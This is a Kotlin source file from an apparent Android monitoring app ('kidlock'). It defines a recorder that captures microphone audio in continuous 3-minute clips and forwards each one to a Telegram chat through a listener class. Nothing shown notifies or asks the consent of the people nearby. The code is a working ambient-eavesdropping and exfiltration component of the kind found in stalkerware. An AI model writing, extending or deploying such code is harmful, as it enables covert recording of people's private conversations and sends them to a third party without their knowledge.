package com.kidlock

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object SurroundingRecorder {

    private const val TAG = "SurroundingRecorder"
    private const val CLIP_DURATION_MS = 3 * 60 * 1000L // 3 minutes

    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var running = false
    private val handler = Handler(Looper.getMainLooper())

    fun start(context: Context) {
        if (running) return
        running = true
        cycle(context)
    }

    private fun cycle(context: Context) {
        startClip(context)
        handler.postDelayed({
            stopAndSend()
            if (running) cycle(context)
        }, CLIP_DURATION_MS)
    }

    private fun startClip(context: Context) {
        try {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            currentFile = File(context.cacheDir, "surround_$timestamp.mp3")

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION") MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(currentFile?.absolutePath)
                prepare()
                start()
            }
            Log.d(TAG, "Clip started: ${currentFile?.name}")
        } catch (e: Exception) {
            Log.e(TAG, "startClip error: ${e.message}")
        }
    }

    private fun stopAndSend() {
        try {
            recorder?.apply { stop(); release() }
            recorder = null

            currentFile?.let { file ->
                if (file.exists() && file.length() > 1024) {
                    TelegramListener.instance.sendAudio(
                        file.absolutePath,
                        "🎙️ Surrounding — ${SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())}"
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "stopAndSend error: ${e.message}")
        }
    }

    fun stop() {
        running = false
        handler.removeCallbacksAndMessages(null)
        stopAndSend()
    }
}
